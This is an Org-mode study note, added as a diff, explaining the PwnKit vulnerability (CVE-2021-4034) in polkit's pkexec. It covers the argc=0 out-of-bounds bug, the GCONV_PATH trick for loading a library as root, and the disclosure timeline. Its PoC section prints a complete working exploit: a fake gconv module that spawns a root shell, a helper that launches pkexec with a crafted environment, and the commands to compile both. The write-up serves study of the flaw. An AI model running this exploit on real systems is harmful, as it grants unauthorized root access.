@@ -1,0 +1,309 @@
+#+TITLE: CVEs 02 – CVE-2021-4034 – PWNKIT
+#+AUTHOR: Leonardo Tamiano
+
+* Resources
+  
+  About.
+  - https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+  - [[https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034][PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)]]
+  - https://docs.gtk.org/glib/
+
+  PoCs:
+  - https://github.com/ly4k/PwnKit
+  - https://github.com/arthepsy/CVE-2021-4034/
+  - https://github.com/Ayrx/CVE-2021-4034
+
+* Introduction
+  The vulnerability is a ~memory corruption~ in polkit's ~pkexec~, which
+  is a SUID-root program that is installed by default on many linux
+  distributions.
+
+  The vulnerability is easily exploitable and leads to root
+  privileges.
+
+  I shall now try to answer a bunch of common questions:
+
+  - What is polkit pkexec usd for?
+
+  - Where is the vulnerability code-wise?
+
+  - How can we exploti it?
+
+  - Potential damages and coverage window?
+
+** Polkit pkexe
+   Polkit (formerly PolicyKit) is a component for controlling
+   system-wide privileges in Unix-like OSes.
+
+   It allows to:
+
+   - organize the way non-privilege process are able to communicate
+     with privileged ones.
+
+   - execute commands with elevated privileges.
+
+** Potential damage and coverage window
+   A succesful exploitation leads to full root privileges on the
+   vulnerable host.
+
+   This vulnerability has been hiding in plain sight for 12+ years,
+   and it affects all versions of ~pkexec~ since its first version in
+   may 2009 with commit ~c8c3d83~ called "Add a pkexec(1) command".
+   
+** Disclosure Timeline
+   The disclosure timeline was:
+
+   - 2021/11/18 sent vulnerability.
+   - 2022/01/11 advisory and patch.
+   - 2022/01/25 coordinated release date.
+
+* How does it work?
+  To demo this shit maybe we can pull from the original repo, which I think is the following one
+
+  [[https://gitlab.freedesktop.org/polkit/polkit/-/tree/master][gitlab - polkit]]
+
+  then we go back to a release before commit ~a2b5c9c~. For example we
+  could go back to the previous one such as ~4ff1abe4~, or to the first
+  that introduced the ~pkexec()~ program such as ~c8c3d83~.
+
+  #+begin_src sh
+git clone https://gitlab.freedesktop.org/polkit/polkit.git
+cd polkit
+git checkout 4ff1abe4a4c1f8c8378b9eaddb0346ac6448abd8
+  #+end_src
+
+  Andiamo quindi ad analizzare il file ~polkit/src/programs/pkexec.c~.
+
+  # TODO: add code
+
+  The basic functioning of the pkexec program is that it takes in
+  input the path of a program. If the path is not absolute, the
+  program is searched in the directories of the PATH environment
+  variables.
+
+  Now, typically when programs execute the value of ~argc~ is always 1,
+  and the value of ~argv[1]~ is a pointer that points to the name of the
+  program being invoked. This is because of how the shell is written.
+
+  If we instead use directly q the system call ~execve()~ to call a new
+  program, we can set ~argc~ to 0, and thus ~argv[0]~ would point to ~NULL~,
+  the list's terminator.
+
+  That's where the problem arises, because in the original code there
+  is a for loop which sets a variable ~n~ to be ~1~
+
+  #+begin_src c
+for (n = 1; n < (guint) argc; n++) {
+  // ...
+ }
+  #+end_src
+
+  If ~argc~ is ~0~ this loop never executes, but ~n~ is simply set to ~1~.
+
+  After some lines then we call a function called ~g_strdup()~ with the
+  value ~argv[n]~, which in our execution will be ~argv[1]~. Notice how
+  this is where the *memory corruption* occurs: sicne ~argc~ was ~0~, the
+  ~argv~ array of pointers was supposed to only contain a single ~NULL~
+  element.
+
+  This call duplicates a string, and its made to copy the path that is
+  then used for searching the program.
+
+  #+begin_src c
+path = g_strdup (argv[n]);
+  #+end_src
+
+  This means that *the pointer path is read out-of-bounds from argv[1]*.
+
+  Finally ,continuing, if the supposed name of the program does not
+  start with a ~/~, then we find the program in the path using
+  ~g_find_program_in_path()~ and we do a write out-of-bounds to *argv[1]*.
+
+  #+begin_src c
+if (path[0] != '/')
+{
+  // ...
+  s = g_find_program_in_path (path);
+  // ...
+  argv[n] = path = s;
+}
+  #+end_src
+  
+  Now we know we have a memory corruption. The next thing to
+  understand is how this can be exploited.
+
+  When we ~execve()~ a new program, the kernel copies our argument, env
+  strings, and pointers (argv and envp) to the end of the new
+  program's stack.
+
+  #+begin_example
+|---------+---------+-----+------------|---------+---------+-----+------------| 
+| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] | 
+|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| 
+V         V                V           V         V                V 
+"program" "-option"           NULL      "value" "PATH=name"          NULL 
+  #+end_example
+
+  Notice how ~argv~ and ~envp~ are contiguous in memory. This means that
+  if ~argc~ is ~0~, then the out-of-bounds argv[1] is actually envp[0],
+  the pointer to the first environment variable, "value".
+
+  In steps, this means that:
+
+  1. the path of the program to be executed is read out-of-bounds from
+     ~argv[1]~, which is actually ~envp[0]~, which is the pointer to the
+     first enviromental variable, "value".
+
+  2. the path "value" is passed to ~g_find_program_in_path()~ since
+     "value" does not start with a slash.
+
+  3. If such an executable file is found, its full path is returned to
+     pkexec's main().
+
+  4. Finally, this full path is written out-of-bounds to argv[1],
+     which is envp[0], thus allowing us to overwrite our first
+     environment variable.
+  
+  Said in another way:
+
+  - If our PATH environment variable is "PATH=name", and if the
+    directory "name" exists (in the cwd) and contains an executable
+    file named "value", then a pointer to the string "name/value" is
+    written out-of-bounds to envp[0];
+
+  - If our PATH is PATH=name=.", and if the directory "name=." exists
+    and contains an executable file named "value", then a pointer to
+    the string "name=./value" is written out-of-bounds to envp[0].
+  
+  This means that this out-of-bounds allows us to re-introduce an
+  "unsecure" environment variable, like ~LD_PRELOAD~ into pkexec's
+  environment, which are typically removed by ~ld.so~ in case of a SUID
+  program.
+
+  ------------------------------------------
+  
+  The actual variable to introduce is found in the Glib library, which
+  is a GNOME library written in C for doing small things. 
+  
+  In particular this vulnerability is used in the context of printing
+  error messages, with the function ~g_printerr()~. Both the functions
+  ~validate_environment_variable()~ and ~log_message()~ internally cal
+  ~g_printerr()~.
+  
+  ~g_printerr()~ normally prints UTF-8 error messages, but it can print
+  messages in another charset if the environment variable ~CHARSET~ is
+  not ~UTF-8~. To convert from UTF-8 to another charset, ~g_printerr()~
+  calls ~glib'c~ function ~iconv_open()~.
+  
+  Finally, ~iconv_openn()~ executes small shared libraries, which are
+  typically read from a default configuration file in
+  ~/usr/lib/gconv/gconv-modules~.
+  
+  Alternatively, the environment variable ~GCONV_PATH~ can force
+  ~iconv_open()~ to read another configuration file. 
+  
+  Sicne ~GCONV_PATH~ allows one to execute arbitrary libraries, it is
+  typically removed by ~ld.so~ when executing SUID binaries. However,
+  since ~CVE-2021-4034~ allows us to re-introduce ~GCONV_PATH~ into
+  pkexec's environment, we are able to execute our own shared library,
+  as root.
+
+* PoC
+  Taken from https://github.com/mebeim/CVE-2021-4034
+  
+  #+begin_src sh
+git clone https://github.com/mebeim/CVE-2021-4034
+cd CVE-2021-4034
+./expl.sh
+  #+end_src
+
+  First we create a fake gconv module which runs arbitrary code
+  
+  #+begin_src c
+/**
+ ,* A fake gconv module (shared library) which runs arbitrary code when loaded by
+ ,* the dynamic loader.
+ ,*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <syscall.h>
+#include <sys/types.h>
+
+void __attribute__ ((constructor)) init(void) {
+	if (geteuid() == 0) {
+		fputs("Pwned!\n", stderr);
+
+		setuid(0);
+		setgid(0);
+		setegid(0);
+
+		setenv("PATH", "/usr/local/bin:/usr/bin:/bin", 1);
+		execvp("sh", (char *[]){"sh", NULL});
+		perror("execvp failed");
+	} else {
+		fputs("Failed :(\n", stderr);
+	}
+
+	syscall(SYS_exit_group, 1);
+}
+  #+end_src
+
+  Then we use an ~helper.c~ to execute ~execvpe~ so as to copy the
+  environment aswell.
+  
+  The environment we will define is constructed in such a way as to
+  allow the exploit to work.
+  
+  #+begin_src c
+/**
+ ,* Just an helper to run pkexec with empty argv and the appropriate env vars.
+ ,*/
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void) {
+	char *const envp[] = {
+		// This pointer will be overridden by pkexec with an OOB write on argv.
+		"fake_exe",
+
+		// If this dir exists and fake_exe exists within it,
+		// g_find_program_in_path() will return "GCONV_PATH=./fake_exe", which
+		// will overwrite envp[0] essentially setting up the GCOV_PATH env var.
+		"PATH=GCONV_PATH=.",
+
+		// A shell that is not present under /etc/shells, so that pkexec's
+		// validate_environment_variable() fails, calling g_printerr().
+		"SHELL=x",
+
+		// An encoding that is not UTF-8 (even made up), so g_printerr() invokes
+		// a loadable module for string conversion as specified by the config
+		// file $GCONV_PATH/gconv-modules, which in this case will point to
+		// fake_module.so compiled from fake_module.c.
+		"CHARSET=banana",
+		NULL
+	};
+
+	execvpe("pkexec", (char *[]){NULL}, envp);
+	perror("execvpe failed");
+	return 1;
+}
+
+  #+end_src
+
+  Then, to make this work, we first compile the fake_module as a
+  shared library which will then be called by ~g_printerr()~ and the
+  helper binary.
+
+  #+begin_src sh
+gcc -fPIC -shared -o fake_exe/fake_module.so fake_module.c
+gcc -o helper helper.c
+  #+end_src
+
+  
+  
